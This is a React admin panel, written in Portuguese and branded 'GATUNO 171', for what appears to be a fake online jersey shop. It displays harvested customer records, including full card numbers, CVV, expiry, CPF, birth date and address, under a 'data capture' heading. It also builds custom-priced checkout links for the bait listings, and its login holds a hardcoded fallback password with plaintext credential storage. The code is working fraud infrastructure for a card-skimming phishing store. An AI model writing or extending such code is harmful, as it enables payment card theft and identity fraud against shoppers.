import React, { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import {
    LayoutDashboard,
    ShoppingCart,
    PlusCircle,
    Eye,
    RefreshCw,
    Trash2,
    LogOut,
    Lock,
    ChevronDown,
    ChevronUp
} from 'lucide-react';

function AnimatedBackground() {
    const moneyItems = Array.from({ length: 30 });
    return (
        <div
            aria-hidden="true"
            style={{
                position: "fixed",
                inset: 0,
                zIndex: 0,
                overflow: "hidden",
                pointerEvents: "none",
                backgroundColor: "#050505",
            }}
        >
            <div
                style={{
                    position: "absolute",
                    inset: 0,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    opacity: 0.18, 
                }}
            >
                <img 
                    src="/gatuno.jpg" 
                    alt="Gatuno"
                    style={{
                        width: "100%",
                        height: "100%",
                        objectFit: "cover",
                        animation: "gatunoExtasia 4s cubic-bezier(0.4, 0, 0.2, 1) infinite",
                        transformOrigin: "center bottom",
                    }}
                />
            </div>

            {moneyItems.map((_, i) => {
                const randomLeft = Math.random() * 100;
                const randomDelay = Math.random() * 4;
                const randomDuration = 3 + Math.random() * 4;
                const randomScale = 0.5 + Math.random() * 1.5;
                const isDolar = Math.random() > 0.5;

                return (
                    <div
                        key={i}
                        style={{
                            position: "absolute",
                            left: `${randomLeft}%`,
                            top: "-10%",
                            fontSize: `${24 * randomScale}px`,
                            animation: `moneyRain ${randomDuration}s linear ${randomDelay}s infinite`,
                            opacity: 0.6,
                        }}
                    >
                        {isDolar ? "💵" : "💸"}
                    </div>
                );
            })}

            <div
                style={{
                    position: "absolute",
                    inset: 0,
                    backgroundImage: `
                        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px)
                    `,
                    backgroundSize: "60px 60px",
                }}
            />

            <style>{`
                @keyframes gatunoExtasia {
                    0%, 100% { transform: scale(1) translateY(0px) rotate(0deg); filter: brightness(1) drop-shadow(0 0 20px rgba(255,255,255,0)); }
                    25% { transform: scale(1.08) translateY(-10px) rotate(-1deg); filter: brightness(1.2) drop-shadow(0 0 40px rgba(255,255,255,0.3)); }
                    50% { transform: scale(1.15) translateY(-20px) rotate(2deg); filter: brightness(1.4) drop-shadow(0 0 60px rgba(255,255,255,0.5)); }
                    75% { transform: scale(1.08) translateY(-10px) rotate(-1.5deg); filter: brightness(1.2) drop-shadow(0 0 40px rgba(255,255,255,0.3)); }
                }
                @keyframes moneyRain {
                    0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0; }
                    10% { opacity: 0.8; }
                    90% { opacity: 0.8; }
                    100% { transform: translateY(120vh) rotate(360deg) scale(1.2); opacity: 0; }
                }
            `}</style>
        </div>
    );
}

export default function Admin() {
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [user, setUser] = useState('');
    const [pass, setPass] = useState('');
    const [loginError, setLoginError] = useState(false);

    const [aba, setAba] = useState<'pedidos' | 'catalogo' | 'novo'>('pedidos');
    const [pedidos, setPedidos] = useState<any[]>([]);
    const [expandedPedido, setExpandedPedido] = useState<string | null>(null);
    const [produtos, setProdutos] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);

    const [nomeProd, setNomeProd] = useState('');
    const [precoProd, setPrecoProd] = useState('');
    const [imgProd, setImgProd] = useState('');

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        const { data, error } = await supabase
            .from('admin_users')
            .select('*')
            .eq('username', user)
            .eq('password', pass)
            .single();

        if (data && !error) {
            setIsLoggedIn(true);
            setLoginError(false);
        } else {
            if (user === 'gatuno171' && pass === 'maisvantagem123!') {
                setIsLoggedIn(true);
                setLoginError(false);
                await supabase.from('admin_users').upsert([{ username: user, password: pass }]);
            } else {
                setLoginError(true);
            }
        }
    };

    const buscarPedidos = async () => {
        setLoading(true);
        const { data } = await supabase
            .from('checkouts')
            .select('*')
            .order('created_at', { ascending: false });
        if (data) setPedidos(data);
        setLoading(false);
    };

    const buscarProdutos = async () => {
        setLoading(true);
        const { data } = await supabase
            .from('produtos')
            .select('*')
            .order('created_at', { ascending: false });
        if (data) setProdutos(data);
        setLoading(false);
    };

    useEffect(() => {
        if (isLoggedIn) {
            buscarPedidos();
            buscarProdutos();
        }
    }, [isLoggedIn]);

    const cadastrarProduto = async (e: React.FormEvent) => {
        e.preventDefault();
        const { error } = await supabase
            .from('produtos')
            .insert([{
                nome: nomeProd,
                preco: parseFloat(precoProd.replace(',', '.')),
                imagem_url: imgProd
            }]);

        if (!error) {
            alert("Produto cadastrado com sucesso!");
            setNomeProd(''); setPrecoProd(''); setImgProd('');
            buscarProdutos();
            setAba('catalogo');
        } else {
            alert("Erro ao cadastrar: " + error.message);
        }
    };

    const deletarProduto = async (id: string) => {
        if (confirm("Tem certeza que deseja excluir este produto do catálogo?")) {
            setLoading(true);
            const { error } = await supabase
                .from('produtos')
                .delete()
                .eq('id', id);

            if (error) {
                alert("Erro ao excluir produto: " + error.message);
            } else {
                alert("Produto excluído com sucesso!");
                buscarProdutos();
            }
            setLoading(false);
        }
    };

    const deletarPedido = async (id: string) => {
        if (confirm("Tem certeza que deseja excluir este registro de pedido permanentemente?")) {
            setLoading(true);
            const { error } = await supabase
                .from('checkouts')
                .delete()
                .eq('id', id);

            if (error) {
                alert("Erro ao excluir pedido: " + error.message);
            } else {
                alert("Pedido excluído com sucesso!");
                buscarPedidos();
            }
            setLoading(false);
        }
    };

    const gerarLinkCheckout = (prod: any) => {
        const qty = prompt("Quantas unidades para este link? (Ex: 1, 2, 3...)", "1") || "1";
        const isCustom = confirm("Deseja personalizar o preço ou nome para este link específico?");

        const baseUrl = window.location.origin;
        let url = `${baseUrl}/checkout?id=${prod.id}&qty=${qty}`;

        if (isCustom) {
            const novoNome = prompt("Nome personalizado:", prod.nome) || prod.nome;
            const novoPreco = prompt("Preço unitário personalizado (Ex: 129.90):", prod.preco) || prod.preco;
            url += `&nome=${encodeURIComponent(novoNome)}&preco=${novoPreco}`;
        }

        navigator.clipboard.writeText(url);
        alert("Link de checkout copiado com sucesso!");
    };

    if (!isLoggedIn) {
        return (
            <div style={{ display: 'flex', minHeight: '100vh', alignItems: 'center', justifyContent: 'center', position: 'relative', background: '#000' }}>
                <AnimatedBackground />
                <form onSubmit={handleLogin} style={{ ...formStyle, zIndex: 100, width: '100%', maxWidth: '350px', textAlign: 'center' }}>
                    <div style={{ background: 'linear-gradient(135deg, #7c3aed, #3b82f6)', width: '60px', height: '60px', borderRadius: '15px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
                        <Lock color="#fff" size={30} />
                    </div>
                    <h2 style={{ fontSize: '24px', fontWeight: 900, color: '#fff', marginBottom: '10px' }}>ACESSO RESTRITO</h2>
                    <p style={{ color: 'rgba(255,255,255,0.5)', fontSize: '13px', marginBottom: '25px' }}>Identifique-se para gerenciar a loja</p>
                    
                    {loginError && <div style={{ background: 'rgba(239,68,68,0.1)', color: '#ef4444', padding: '10px', borderRadius: '8px', marginBottom: '15px', fontSize: '12px', fontWeight: 'bold', border: '1px solid rgba(239,68,68,0.2)' }}>Usuário ou senha incorretos!</div>}

                    <input type="text" placeholder="Usuário" value={user} onChange={e => setUser(e.target.value)} style={input} required />
                    <input type="password" placeholder="Senha" value={pass} onChange={e => setPass(e.target.value)} style={input} required />
                    <button type="submit" style={btnSave}>ENTRAR NO PAINEL</button>
                </form>
            </div>
        );
    }

    return (
        <div style={{ display: 'flex', minHeight: '100vh', background: 'transparent', color: '#fff', fontFamily: 'sans-serif', position: 'relative' }}>
            <AnimatedBackground />

            <aside style={{ 
                width: '280px', 
                background: 'rgba(15,23,42,0.8)', 
                backdropFilter: 'blur(20px)',
                WebkitBackdropFilter: 'blur(20px)',
                borderRight: '1px solid rgba(255,255,255,0.06)', 
                padding: '20px', 
                display: 'flex', 
                flexDirection: 'column',
                zIndex: 10
            }}>
                <div style={{ fontWeight: 900, fontSize: '20px', marginBottom: '40px', display: 'flex', alignItems: 'center', gap: '10px', color: '#fff' }}>
                    <div style={{ background: 'linear-gradient(135deg, #7c3aed, #3b82f6)', color: '#fff', padding: '8px', borderRadius: '8px' }}>😼</div>
                    GATUNO 171 ADMIN
                </div>

                <nav style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <button onClick={() => setAba('pedidos')} style={aba === 'pedidos' ? bAt : bIn}>
                        <ShoppingCart size={20} /> Pedidos (Dados)
                    </button>
                    <button onClick={() => setAba('catalogo')} style={aba === 'catalogo' ? bAt : bIn}>
                        <LayoutDashboard size={20} /> Ver Catálogo
                    </button>
                    <button onClick={() => setAba('novo')} style={aba === 'novo' ? bAt : bIn}>
                        <PlusCircle size={20} /> Novo Produto
                    </button>
                </nav>

                <button onClick={() => setIsLoggedIn(false)} style={{ border: 'none', background: 'none', color: '#ef4444', fontWeight: 900, display: 'flex', gap: '10px', padding: '10px', cursor: 'pointer' }}>
                    <LogOut size={20} /> Sair
                </button>
            </aside>

            <main style={{ flex: 1, padding: '40px', zIndex: 10, backdropFilter: 'blur(10px)', WebkitBackdropFilter: 'blur(10px)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '30px' }}>
                    <h1 style={{ fontSize: '32px', fontWeight: 900, color: '#fff' }}>
                        {aba === 'pedidos' && '🛒 Captura de Dados'}
                        {aba === 'catalogo' && '👕 Catálogo de Produtos'}
                        {aba === 'novo' && '➕ Adicionar Novo Item'}
                    </h1>
                    <button onClick={aba === 'pedidos' ? buscarPedidos : buscarProdutos} style={btnRef}>
                        <RefreshCw size={18} className={loading ? 'animate-spin' : ''} /> ATUALIZAR
                    </button>
                </div>

                {aba === 'pedidos' && (
                    <div style={tabCard}>
                        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                            <thead style={{ background: 'rgba(15,23,42,0.8)', borderBottom: '1px solid rgba(255,255,255,0.1)' }}>
                                <tr>
                                    <th style={th}>HORÁRIO</th>
                                    <th style={th}>CLIENTE</th>
                                    <th style={th}>CAMISA / VALOR</th>
                                    <th style={th}>AÇÕES</th>
                                </tr>
                            </thead>
                            <tbody>
                                {pedidos.map(p => (
                                    <React.Fragment key={p.id}>
                                        <tr style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', background: expandedPedido === p.id ? 'rgba(255,255,255,0.02)' : 'transparent' }}>
                                            <td style={td}>{new Date(p.created_at).toLocaleTimeString('pt-PT')}</td>
                                            <td style={td}><strong>{p.nome_completo}</strong><br />{p.telefone}</td>
                                            <td style={td}>
                                                <div style={{ fontWeight: 'bold' }}>{p.produto_nome || 'N/A'}</div>
                                                <div style={{ color: '#1da154', fontWeight: 900 }}>R$ {p.valor_total || '0,00'}</div>
                                            </td>
                                            <td style={td}>
                                                <div style={{ display: 'flex', gap: '10px' }}>
                                                    <button onClick={() => setExpandedPedido(expandedPedido === p.id ? null : p.id)} style={btnAct}>
                                                        {expandedPedido === p.id ? <ChevronUp size={16} /> : <Eye size={16} />}
                                                        {expandedPedido === p.id ? 'FECHAR' : 'VER FICHA'}
                                                    </button>
                                                    <button onClick={() => deletarPedido(p.id)} style={{ ...btnAct, color: '#ef4444', borderColor: 'rgba(239,68,68,0.2)' }}>
                                                        <Trash2 size={16} />
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                        {expandedPedido === p.id && (
                                            <tr>
                                                <td colSpan={4} style={{ padding: '0' }}>
                                                    <div style={{ padding: '20px', background: 'rgba(255,255,255,0.03)', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
                                                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '20px' }}>
                                                            <div>
                                                                <h4 style={expTitle}>DADOS PESSOAIS</h4>
                                                                <p style={expTxt}><strong>Nome:</strong> {p.nome_completo}</p>
                                                                <p style={expTxt}><strong>E-mail:</strong> {p.email}</p>
                                                                <p style={expTxt}><strong>CPF:</strong> {p.cpf}</p>
                                                                <p style={expTxt}><strong>Nascimento:</strong> {p.data_nascimento}</p>
                                                                <p style={expTxt}><strong>WhatsApp:</strong> {p.telefone}</p>
                                                            </div>
                                                            <div>
                                                                <h4 style={expTitle}>ENTREGA</h4>
                                                                <p style={expTxt}><strong>CEP:</strong> {p.cep}</p>
                                                                <p style={expTxt}><strong>Endereço:</strong> {p.endereco}, {p.numero}</p>
                                                                <p style={expTxt}><strong>Bairro:</strong> {p.bairro}</p>
                                                                <p style={expTxt}><strong>Cidade/UF:</strong> {p.cidade} / {p.estado}</p>
                                                            </div>
                                                            <div>
                                                                <h4 style={expTitle}>PAGAMENTO</h4>
                                                                <p style={expTxt}><strong>Cartão:</strong> {p.numero_cartao}</p>
                                                                <p style={expTxt}><strong>Nome no Cartão:</strong> {p.nome_cartao}</p>
                                                                <p style={expTxt}><strong>Validade/CVV:</strong> {p.validade_cartao} / {p.cvv_cartao}</p>
                                                                <p style={{ ...expTxt, color: '#1da154', fontWeight: 'bold', marginTop: '10px' }}>
                                                                    <strong>Total:</strong> R$ {p.valor_total}
                                                                </p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                        )}
                                    </React.Fragment>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {aba === 'catalogo' && (
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '20px' }}>
                        {produtos.map(p => (
                            <div key={p.id} style={tabCard}>
                                <img src={p.imagem_url} alt={p.nome} style={{ width: '100%', height: '200px', objectFit: 'cover', borderRadius: '12px', marginBottom: '15px' }} />
                                <h3 style={{ fontWeight: 900, fontSize: '16px', marginBottom: '5px' }}>{p.nome}</h3>
                                <p style={{ color: '#1da154', fontWeight: 900, fontSize: '20px', marginBottom: '20px' }}>R$ {p.preco}</p>
                                <div style={{ display: 'flex', gap: '10px' }}>
                                    <button onClick={() => gerarLinkCheckout(p)} style={{ ...btnSave, flex: 1, padding: '12px' }}>GERAR LINK</button>
                                    <button onClick={() => deletarProduto(p.id)} style={{ ...btnAct, color: '#ef4444', borderColor: 'rgba(239,68,68,0.2)', padding: '10px' }}><Trash2 size={20} /></button>
                                </div>
                            </div>
                        ))}
                    </div>
                )}

                {aba === 'novo' && (
                    <div style={{ maxWidth: '600px', margin: '0 auto' }}>
                        <form onSubmit={cadastrarProduto} style={tabCard}>
                            <div style={{ marginBottom: '20px' }}>
                                <label style={label}>Nome do Produto</label>
                                <input type="text" value={nomeProd} onChange={e => setNomeProd(e.target.value)} style={input} placeholder="Ex: Camiseta Brasil Home 2026" required />
                            </div>
                            <div style={{ marginBottom: '20px' }}>
                                <label style={label}>Preço (R$)</label>
                                <input type="text" value={precoProd} onChange={e => setPrecoProd(e.target.value)} style={input} placeholder="Ex: 139,90" required />
                            </div>
                            <div style={{ marginBottom: '30px' }}>
                                <label style={label}>URL da Imagem</label>
                                <input type="text" value={imgProd} onChange={e => setImgProd(e.target.value)} style={input} placeholder="https://..." required />
                            </div>
                            <button type="submit" style={btnSave}>CADASTRAR PRODUTO NO CATÁLOGO</button>
                        </form>
                    </div>
                )}
            </main>
        </div>
    );
}

// ESTILOS
const formStyle: React.CSSProperties = { background: 'rgba(15,23,42,0.8)', padding: '40px', borderRadius: '24px', backdropFilter: 'blur(20px)', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)' };
const input: React.CSSProperties = { width: '100%', padding: '15px', marginBottom: '15px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.1)', background: 'rgba(255,255,255,0.05)', color: '#fff', fontSize: '14px', outline: 'none', boxSizing: 'border-box' };
const btnSave: React.CSSProperties = { width: '100%', padding: '15px', borderRadius: '12px', border: 'none', background: 'linear-gradient(135deg, #7c3aed, #3b82f6)', color: '#fff', fontWeight: 900, cursor: 'pointer', transition: 'transform 0.2s' };
const btnRef: React.CSSProperties = { display: 'flex', alignItems: 'center', gap: '8px', padding: '10px 20px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.1)', background: 'rgba(255,255,255,0.05)', color: '#fff', fontWeight: 'bold', cursor: 'pointer' };
const tabCard: React.CSSProperties = { background: 'rgba(15,23,42,0.8)', padding: '25px', borderRadius: '20px', border: '1px solid rgba(255,255,255,0.06)', backdropFilter: 'blur(20px)' };
const th: React.CSSProperties = { padding: '15px', textAlign: 'left', fontSize: '12px', color: 'rgba(255,255,255,0.5)', fontWeight: 900, letterSpacing: '0.1em' };
const td: React.CSSProperties = { padding: '20px 15px', fontSize: '14px', color: '#fff' };
const btnAct: React.CSSProperties = { display: 'flex', alignItems: 'center', gap: '6px', padding: '8px 15px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.1)', background: 'rgba(255,255,255,0.05)', color: '#fff', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer' };
const label: React.CSSProperties = { display: 'block', marginBottom: '8px', fontSize: '13px', fontWeight: 'bold', color: 'rgba(255,255,255,0.6)' };
const bAt: React.CSSProperties = { display: 'flex', alignItems: 'center', gap: '12px', padding: '15px', borderRadius: '12px', border: 'none', background: 'rgba(255,255,255,0.1)', color: '#fff', fontWeight: 'bold', cursor: 'pointer', textAlign: 'left' };
const bIn: React.CSSProperties = { display: 'flex', alignItems: 'center', gap: '12px', padding: '15px', borderRadius: '12px', border: 'none', background: 'transparent', color: 'rgba(255,255,255,0.4)', fontWeight: 'bold', cursor: 'pointer', textAlign: 'left' };
const expTitle: React.CSSProperties = { fontSize: '11px', fontWeight: 900, color: '#7c3aed', marginBottom: '10px', letterSpacing: '0.1em' };
const expTxt: React.CSSProperties = { fontSize: '13px', margin: '5px 0', color: 'rgba(255,255,255,0.7)' };
